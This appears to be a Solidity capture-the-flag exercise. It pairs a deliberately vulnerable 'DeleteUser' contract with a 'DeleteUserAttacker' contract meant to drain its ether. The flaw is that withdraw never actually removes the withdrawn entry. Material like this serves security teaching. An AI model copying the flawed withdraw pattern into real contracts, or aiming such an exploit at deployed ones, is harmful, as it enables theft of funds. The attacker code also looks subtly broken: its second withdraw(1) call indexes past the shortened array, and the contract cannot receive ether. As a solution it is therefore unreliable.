pragma solidity 0.8.15;

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */
 
contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] private users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }
}

contract DeleteUserAttacker {
    constructor(address _victim) payable {
        DeleteUser(_victim).deposit{value: 1 ether}();

        DeleteUser(_victim).deposit();

        DeleteUser(_victim).withdraw(1);

        DeleteUser(_victim).withdraw(1);
    }
}
